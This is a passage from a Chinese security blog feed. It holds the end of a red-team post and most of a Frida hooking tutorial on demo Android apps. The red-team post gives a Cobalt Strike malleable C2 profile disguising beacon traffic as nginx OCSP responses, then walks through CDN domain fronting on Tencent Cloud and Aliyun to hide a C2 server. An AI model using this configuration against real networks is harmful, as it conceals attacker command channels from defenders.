(KHTML, like Gecko) Chrome/95.0.4638.54 Safari/537.36&quot;;</span><br><span class="line"></span><br><span class="line">http-get &#123;</span><br><span class="line"></span><br><span class="line">    set uri &quot;/api/x&quot;;</span><br><span class="line"></span><br><span class="line">    client &#123;</span><br><span class="line">        header &quot;Accept&quot; &quot;*/*&quot;;</span><br><span class="line">        metadata &#123;</span><br><span class="line">            base64;</span><br><span class="line">            prepend &quot;SESSIONID=&quot;;</span><br><span class="line">            header &quot;Cookie&quot;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    server &#123;</span><br><span class="line">        header &quot;Content-Type&quot; &quot;application/ocsp-response&quot;;</span><br><span class="line">        header &quot;content-transfer-encoding&quot; &quot;binary&quot;;</span><br><span class="line">        header &quot;Server&quot; &quot;nginx&quot;;</span><br><span class="line">        output &#123;</span><br><span class="line">            base64;</span><br><span class="line">            print;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">http-stager &#123;  </span><br><span class="line">    set uri_x86 &quot;/vue.min.js&quot;;</span><br><span class="line">    set uri_x64 &quot;/bootstrap-2.min.js&quot;;</span><br><span class="line">&#125;</span><br><span class="line">http-post &#123;</span><br><span class="line">    set uri &quot;/api/y&quot;;</span><br><span class="line">    client &#123;</span><br><span class="line">        header &quot;Accept&quot; &quot;*/*&quot;;</span><br><span class="line">        id &#123;</span><br><span class="line">            base64;</span><br><span class="line">            prepend &quot;JSESSION=&quot;;</span><br><span class="line">            header &quot;Cookie&quot;;</span><br><span class="line">        &#125;</span><br><span class="line">        output &#123;</span><br><span class="line">            base64;</span><br><span class="line">            print;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    server &#123;</span><br><span class="line">        header &quot;Content-Type&quot; &quot;application/ocsp-response&quot;;</span><br><span class="line">        header &quot;content-transfer-encoding&quot; &quot;binary&quot;;</span><br><span class="line">        header &quot;Connection&quot; &quot;keep-alive&quot;;</span><br><span class="line">        output &#123;</span><br><span class="line">            base64;</span><br><span class="line">            print;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">http-config &#123;</span><br><span class="line">        set trust_x_forwarded_for &quot;true&quot;;</span><br><span class="line">&#125;</span><br><span class="line">https-certificate &#123;</span><br><span class="line">    set keystore &quot;xxxxxxxx.store&quot;;</span><br><span class="line">    set password &quot;123456&quot;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/V3teran/cloudimg/img/202112152342399.png" alt="image.png"></p><p>不过特征还是挺明显的，把相关api格式的域名干掉就没办法了。</p><p><img src="https://cdn.jsdelivr.net/gh/V3teran/cloudimg/img/202112152342027.png" alt="image.png"></p><p><img src="https://cdn.jsdelivr.net/gh/V3teran/cloudimg/img/202112152342217.png" alt="image.png"></p><h1 id="域前置"><a href="#域前置" class="headerlink" title="域前置"></a>域前置</h1><p>利用CDN节点把流量转发到C2服务器，而CDN是通过识别请求的host头来进行流量回源。</p><p>假设同一个CDN厂商下有两个域名a.com、b.com，发送命令：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl a.com -H &quot;Host:b.com&quot;</span><br></pre></td></tr></table></figure><p>这样访问的是b.com的内容，不管是访问a.com还是CDN的ip。</p><h2 id="腾讯云"><a href="#腾讯云" class="headerlink" title="腾讯云"></a>腾讯云</h2><p><strong>http</strong></p><p>开启CDN服务，添加高可信域名，按理说随便填一个没有人绑定过的域名就好了。绑定C2的ip，以下尝试非腾讯云服务器。</p><p><img src="https://cdn.jsdelivr.net/gh/V3teran/cloudimg/img/202112212221884.png" alt="image-20211221221856677"></p><p>提示要绑定CNAME，不用管。</p><p><img src="https://cdn.jsdelivr.net/gh/V3teran/cloudimg/img/202112212221728.png" alt="image-20211221221911604"></p><p>修改malleable中的host。</p><p><img src="https://cdn.jsdelivr.net/gh/V3teran/cloudimg/img/202112212221670.png" alt="image-20211221221922293"></p><p>启动teamserver新建listener。HTTP Hosts和Stage也可填写CDN的ip，nslookup或者ping一下就行，不过建议域名。</p><img src="https://cdn.jsdelivr.net/gh/V3teran/cloudimg/img/202112212221109.png" alt="image-20211221221937873" style="zoom:50%;" /><p>上线。</p><p><img src="https://cdn.jsdelivr.net/gh/V3teran/cloudimg/img/202112212221799.png" alt="image-20211221221951121"></p><p>流量已指向CDN，并且伪装了host。</p><p><img src="https://cdn.jsdelivr.net/gh/V3teran/cloudimg/img/202112212221587.png" alt="image-20211221221959710"></p><p><strong>https</strong></p><p>修改配置。</p><p><img src="https://cdn.jsdelivr.net/gh/V3teran/cloudimg/img/202112212221026.png" alt="image-20211221151001-2ct6h62"></p><p>配置malleable文件启动证书，上线。</p><p><img src="https://cdn.jsdelivr.net/gh/V3teran/cloudimg/img/202112212222236.png" alt="image-20211221220304978"></p><h2 id="阿里云"><a href="#阿里云" class="headerlink" title="阿里云"></a>阿里云</h2><p><strong>http</strong></p><p><img src="https://cdn.jsdelivr.net/gh/V3teran/cloudimg/img/202112212356782.png" alt="image-20211221235626608"></p><p>记得配置回源策略。</p><p><img src="https://cdn.jsdelivr.net/gh/V3teran/cloudimg/img/202112212357477.png" alt="image-20211221235705377"></p><p><img src="https://cdn.jsdelivr.net/gh/V3teran/cloudimg/img/202112212357665.png" alt="image-20211221235722247"></p><p><img src="https://cdn.jsdelivr.net/gh/V3teran/cloudimg/img/202112212357141.png" alt="image-20211221235727850"></p><h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p><a href="https://xz.aliyun.com/t/9542">https://xz.aliyun.com/t/9542</a></p><p><a href="https://www.bilibili.com/read/cv12492185">https://www.bilibili.com/read/cv12492185</a></p><p><a href="https://www.wangt.cc/2021/02/cobalt-strike%E7%89%B9%E5%BE%81%E9%9A%90%E8%97%8F/">https://www.wangt.cc/2021/02/cobalt-strike%E7%89%B9%E5%BE%81%E9%9A%90%E8%97%8F/</a></p><p><a href="https://www.freebuf.com/articles/network/262445.html">https://www.freebuf.com/articles/network/262445.html</a></p><p><a href="https://hosch3n.github.io/2020/12/16/%E6%A3%80%E6%B5%8B%E4%B8%8E%E9%9A%90%E8%97%8FCobaltstrike%E6%9C%8D%E5%8A%A1%E5%99%A8/">https://hosch3n.github.io/2020/12/16/%E6%A3%80%E6%B5%8B%E4%B8%8E%E9%9A%90%E8%97%8FCobaltstrike%E6%9C%8D%E5%8A%A1%E5%99%A8/</a></p><p><a href="https://www.jianshu.com/p/e7701efef047">https://www.jianshu.com/p/e7701efef047</a></p>]]></content>
      
      
      <categories>
          
          <category> 红蓝对抗 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CS </tag>
            
            <tag> CDN </tag>
            
            <tag> 代理 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Frida的几个练习</title>
      <link href="/2021/10/01/82c34b5a.html"/>
      <url>/2021/10/01/82c34b5a.html</url>
      
        <content type="html"><![CDATA[<h1 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h1><p>frida和studio略。</p><p>Tips：</p><p>Android studio创建项目时，低版本手机最好勾上，否则需要注意导入的包AppCompatActivity版本。</p><p><img src="https://cdn.jsdelivr.net/gh/V3teran/cloudimg/img/202110011609743.png" alt="image-20210928111528377"></p><p>运行有可能需要开debugger。</p><p><img src="https://cdn.jsdelivr.net/gh/V3teran/cloudimg/img/202110011609003.png" alt="image-20210928111825378"></p><p>关闭selinux。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">setenforce 0</span><br></pre></td></tr></table></figure><h1 id="hook参数修改结果"><a href="#hook参数修改结果" class="headerlink" title="hook参数修改结果"></a>hook参数修改结果</h1><p>创建项目。fun(50,30)函数求和。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.fridatest.demo01;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> android.support.v7.app.AppCompatActivity;</span><br><span class="line"><span class="keyword">import</span> android.os.Bundle;</span><br><span class="line"><span class="keyword">import</span> android.util.Log;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">MainActivity</span> <span class="keyword">extends</span> <span class="title class_">AppCompatActivity</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">onCreate</span><span class="params">(Bundle savedInstanceState)</span> &#123;</span><br><span class="line">        <span class="built_in">super</span>.onCreate(savedInstanceState);</span><br><span class="line">        setContentView(R.layout.activity_main);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">while</span> (<span class="literal">true</span>)&#123;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                Thread.sleep(<span class="number">1000</span>);</span><br><span class="line">            &#125; <span class="keyword">catch</span> (InterruptedException e) &#123;</span><br><span class="line">                e.printStackTrace();</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            fun(<span class="number">50</span>,<span class="number">30</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">void</span> <span class="title function_">fun</span><span class="params">(<span class="type">int</span> x , <span class="type">int</span> y )</span>&#123;</span><br><span class="line">        Log.d(<span class="string">&quot;Sum&quot;</span> , String.valueOf(x+y));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>logcat。</p><p><img src="https://cdn.jsdelivr.net/gh/V3teran/cloudimg/img/202110011609732.png" alt="image-20210928142642128"></p><p>启动frida-server。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">adb shell &quot;su -c /data/local/tmp/frida-server &amp;&quot;</span><br></pre></td></tr></table></figure><p>loader01.py</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> frida</span><br><span class="line"></span><br><span class="line"><span class="comment"># 连接安卓机上的frida-server</span></span><br><span class="line">device = frida.get_usb_device()</span><br><span class="line"><span class="comment"># 启动`demo01`这个app</span></span><br><span class="line">pid = device.spawn([<span class="string">&quot;com.fridatest.demo01&quot;</span>])</span><br><span class="line">device.resume(pid)</span><br><span class="line">time.sleep(<span class="number">1</span>)</span><br><span class="line">session = device.attach(pid)</span><br><span class="line"><span class="comment"># 加载test01.js脚本</span></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;test01.js&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    script = session.create_script(f.read())</span><br><span class="line">script.load()</span><br><span class="line"></span><br><span class="line"><span class="comment"># 脚本会持续运行等待输入</span></span><br><span class="line"><span class="built_in">input</span>()</span><br></pre></td></tr></table></figure><p>test01.js</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;Script loaded successfully &quot;</span>);</span><br><span class="line">java.<span class="title function_">perform</span>(<span class="keyword">function</span> <span class="title function_">x</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;Inside java perform function&quot;</span>);</span><br><span class="line">    <span class="comment">//定位类</span></span><br><span class="line">    <span class="keyword">var</span> my_class = java.<span class="title function_">use</span>(<span class="string">&quot;com.fridatest.demo01.MainActivity&quot;</span>);</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;java.Use.Successfully!&quot;</span>);<span class="comment">//定位类成功！</span></span><br><span class="line">    <span class="comment">//在这里更改类的方法的实现（implementation）</span></span><br><span class="line">    my_class.<span class="property">fun</span>.<span class="property">implementation</span> = <span class="keyword">function</span>(<span class="params">x,y</span>)&#123;</span><br><span class="line">        <span class="comment">//打印替换前的参数</span></span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>( <span class="string">&quot;original call: fun(&quot;</span>+ x + <span class="string">&quot;, &quot;</span> + y + <span class="string">&quot;)&quot;</span>);</span><br><span class="line">        <span class="comment">//把参数替换成2和5，依旧调用原函数</span></span><br><span class="line">        <span class="keyword">var</span> ret_value = <span class="variable language_">this</span>.<span class="title function_">fun</span>(<span class="number">2</span>, <span class="number">5</span>);</span><br><span class="line">        <span class="keyword">return</span> ret_value;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>运行py，将这段js脚本传递给手机里正在运行的frida-server。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 loader.py</span><br></pre></td></tr></table></figure><p>报错，需要关闭Magisk Hide 。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">frida.NotSupportedError: unable to access PID 519 (zygote64) while preparing for app launch; try disabling Magisk Hide in case it is active</span><br></pre></td></tr></table></figure><p>执行py过后，app自动重启，发现logcat日志显示数据已注入，py控制台可看到原始数据。</p><p><img src="https://cdn.jsdelivr.net/gh/V3teran/cloudimg/img/202110011609955.png" alt="image-20210928134723232"></p><h1 id="隐藏函数主动调用"><a href="#隐藏函数主动调用" class="headerlink" title="隐藏函数主动调用"></a>隐藏函数主动调用</h1><p>创建项目。fun()函数，在参数是两个int的情况下，返回两个int之和。在参数为string类型之下，则返回字符串的小写形式。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.fridatest.demo02;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> android.support.v7.app.AppCompatActivity;</span><br><span class="line"><span class="keyword">import</span> android.os.Bundle;</span><br><span class="line"><span class="keyword">import</span> android.util.Log;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">MainActivity</span> <span class="keyword">extends</span> <span class="title class_">AppCompatActivity</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="type">String</span> <span class="variable">total</span> <span class="operator">=</span> <span class="string">&quot;@@@###@@@&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">onCreate</span><span class="params">(Bundle savedInstanceState)</span> &#123;</span><br><span class="line">        <span class="built_in">super</span>.onCreate(savedInstanceState);</span><br><span class="line">        setContentView(R.layout.activity_main);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">while</span> (<span class="literal">true</span>)&#123;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                Thread.sleep(<span class="number">1000</span>);</span><br><span class="line">            &#125; <span class="keyword">catch</span> (InterruptedException e) &#123;</span><br><span class="line">                e.printStackTrace();</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            fun(<span class="number">50</span>,<span class="number">30</span>);</span><br><span class="line">            Log.d(<span class="string">&quot;ROYSUE.string&quot;</span> , fun(<span class="string">&quot;LoWeRcAsE Me!!!!!!!!!&quot;</span>));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">void</span> <span class="title function_">fun</span><span class="params">(<span class="type">int</span> x , <span class="type">int</span> y )</span>&#123;</span><br><span class="line">        Log.d(<span class="string">&quot;ROYSUE.Sum&quot;</span> , String.valueOf(x+y));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    String <span class="title function_">fun</span><span class="params">(String x)</span>&#123;</span><br><span class="line">        <span class="comment">//total +=x;</span></span><br><span class="line">        <span class="keyword">return</span> x.toLowerCase();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    String <span class="title function_">secret</span><span class="params">()</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> total;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>运行结果。</p><p><img src="https://cdn.jsdelivr.net/gh/V3teran/cloudimg/img/202110011610194.png" alt="image-20210928143445092"></p><p>用之前的py，加入错误处理函数看一下日志，报错。没有处理重载。方法重载就是在一个java类里，方法名称重复，加载参数不同。调用重载方法时，java编译器通过判断方法的参数类型和个数来区分。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> frida</span><br><span class="line"></span><br><span class="line"><span class="comment"># 连接安卓机上的frida-server</span></span><br><span class="line">device = frida.get_usb_device()</span><br><span class="line"><span class="comment"># 启动`demo02`这个app</span></span><br><span class="line">pid = device.spawn([<span class="string">&quot;com.fridatest.demo02&quot;</span>])</span><br><span class="line">device.resume(pid)</span><br><span class="line">time.sleep(<span class="number">1</span>)</span><br><span class="line">session = device.attach(pid)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">my_message_handler</span>(<span class="params">message , payload</span>): <span class="comment">#定义错误处理</span></span><br><span class="line">    <span class="built_in">print</span>(message)</span><br><span class="line">    <span class="built_in">print</span>(payload)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 加载test02.js脚本</span></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;test02.js&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    script = session.create_script(f.read())</span><br><span class="line"></span><br><span class="line">script.on(<span class="string">&quot;message&quot;</span> , my_message_handler) <span class="comment">#调用错误处理</span></span><br><span class="line">script.load()</span><br><span class="line"></span><br><span class="line"><span class="comment"># 脚本会持续运行等待输入</span></span><br><span class="line"><span class="built_in">input</span>()</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/V3teran/cloudimg/img/202110011610624.png" alt="image-20210928161345933"></p><p>需要在js中处理重载。String类不是java基本数据类型，而是java.lang.String类型。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;Script loaded successfully &quot;</span>);</span><br><span class="line">java.<span class="title function_">perform</span>(<span class="keyword">function</span> <span class="title function_">x</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;Inside java perform function&quot;</span>);</span><br><span class="line">    <span class="comment">//定位类</span></span><br><span class="line">    <span class="comment">// var my_class = java.use(&quot;com.fridatest.demo02.MainActivity&quot;);</span></span><br><span class="line">    <span class="comment">// console.log(&quot;java.Use.Successfully!&quot;);//定位类成功！</span></span><br><span class="line">    <span class="comment">// //在这里更改类的方法的实现（implementation）</span></span><br><span class="line">    <span class="comment">// my_class.fun.implementation = function(x,y)&#123;</span></span><br><span class="line">    <span class="comment">//     //打印替换前的参数</span></span><br><span class="line">    <span class="comment">//     console.log( &quot;original call: fun(&quot;+ x + &quot;, &quot; + y + &quot;)&quot;);</span></span><br><span class="line">    <span class="comment">//     //把参数替换成2和5，依旧调用原函数</span></span><br><span class="line">    <span class="comment">//     var ret_value = this.fun(2, 5);</span></span><br><span class="line">    <span class="comment">//     return ret_value;</span></span><br><span class="line">    <span class="comment">// &#125;</span></span><br><span class="line">    <span class="keyword">var</span> my_class = java.<span class="title function_">use</span>(<span class="string">&quot;com.fridatest.demo02.MainActivity&quot;</span>);</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;java.Use.Successfully!&quot;</span>);<span class="comment">//定位类成功！</span></span><br><span class="line">    my_class.<span class="property">fun</span>.<span class="title function_">overload</span>(<span class="string">&quot;int&quot;</span> , <span class="string">&quot;int&quot;</span>).<span class="property">implementation</span> = <span class="keyword">function</span>(<span class="params">x,y</span>)&#123;</span><br><span class="line">        <span class="comment">//打印替换前的参数</span></span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>( <span class="string">&quot;original call: fun(&quot;</span>+ x + <span class="string">&quot;, &quot;</span> + y + <span class="string">&quot;)&quot;</span>);</span><br><span class="line">        <span class="comment">//把参数替换成2和5，依旧调用原函数</span></span><br><span class="line">        <span class="keyword">var</span> ret_value = <span class="variable language_">this</span>.<span class="title function_">fun</span>(<span class="number">2</span>, <span class="number">5</span>);</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>( <span class="string">&quot;Return value: fun(2, 5)&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> ret_value;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">var</span> string_class = java.<span class="title function_">use</span>(<span class="string">&quot;java.lang.String&quot;</span>); <span class="comment">//获取String类型</span></span><br><span class="line">    my_class.<span class="property">fun</span>.<span class="title function_">overload</span>(<span class="string">&quot;java.lang.String&quot;</span>).<span class="property">implementation</span> = <span class="keyword">function</span>(<span class="params">x</span>)&#123;</span><br><span class="line">      <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;*************************************&quot;</span>);</span><br><span class="line">      <span class="keyword">var</span> my_string = string_class.$new(<span class="string">&quot;My TeSt String#####&quot;</span>); <span class="comment">//new一个新字符串</span></span><br><span class="line">      <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;Original arg: &quot;</span> +x );</span><br><span class="line">      <span class="keyword">var</span> ret =  <span class="variable language_">this</span>.<span class="title function_">fun</span>(my_string); <span class="comment">// 用新的参数替换旧的参数，然后调用原函数获取结果</span></span><br><span class="line">      <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;Return value: &quot;</span>+ret);</span><br><span class="line">      <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;*************************************&quot;</span>);</span><br><span class="line">      <span class="keyword">return</span> ret;</span><br><span class="line">&#125;;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/V3teran/cloudimg/img/202110011610502.png" alt="image-20210928170541049"></p><p>frida使用Java.choose(className, callbacks)函数，查找指定类的实例，获得实例后可以调用实例的函数。在js里添加方法。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="title class_">Java</span>.<span class="title function_">choose</span>(<span class="string">&quot;com.fridatest.demo02.MainActivity&quot;</span> , &#123;</span><br><span class="line">    onMatch : <span class="keyword">function</span>(<span class="params">instance</span>)&#123; <span class="comment">//onMatch回调会在找到类的实例后调用，也就是说内存中有多少实例，就会调用多少次</span></span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;Found instance: &quot;</span>+instance);</span><br><span class="line">      <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;Result of secret func: &quot;</span> + instance.<span class="title function_">secret</span>());</span><br><span class="line">  &#125;,</span><br><span class="line">    <span class="attr">onComplete</span>:<span class="keyword">function</span>(<span class="params"></span>)&#123;&#125;</span><br><span class="line">  <span class="comment">//onComplete回调会在所有onMatch完成后调用</span></span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/V3teran/cloudimg/img/202110011610207.png" alt="image-20210928181343074"></p><h1 id="远程调用"><a href="#远程调用" class="headerlink" title="远程调用"></a>远程调用</h1><p>使用frida提供的RPC功能，远程调用secret()函数。</p><p>loader03.py</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> frida</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">my_message_handler</span>(<span class="params">message, payload</span>):</span><br><span class="line">    <span class="built_in">print</span>(message)</span><br><span class="line">    <span class="built_in">print</span>(payload)</span><br><span class="line"></span><br><span class="line">device = frida.get_usb_device()</span><br><span class="line">pid = device.spawn([<span class="string">&quot;com.fridatest.demo02&quot;</span>])</span><br><span class="line">device.resume(pid)</span><br><span class="line">time.sleep(<span class="number">1</span>)</span><br><span class="line">session = device.attach(pid)</span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;test03.js&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    script = session.create_script(f.read())</span><br><span class="line">script.on(<span class="string">&quot;message&quot;</span>, my_message_handler)</span><br><span class="line">script.load()</span><br><span class="line"></span><br><span class="line">command = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">while</span> <span class="number">1</span> == <span class="number">1</span>:</span><br><span class="line">    command = <span class="built_in">input</span>(<span class="string">&quot;Enter command:\n1: Exit\n2: Call secret function\nchoice:&quot;</span>)</span><br><span class="line">    <span class="keyword">if</span> command == <span class="string">&quot;1&quot;</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">elif</span> command == <span class="string">&quot;2&quot;</span>: <span class="comment">#在这里调用</span></span><br><span class="line">        script.exports.callsecretfunction()</span><br></pre></td></tr></table></figure><p>test03.js</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span 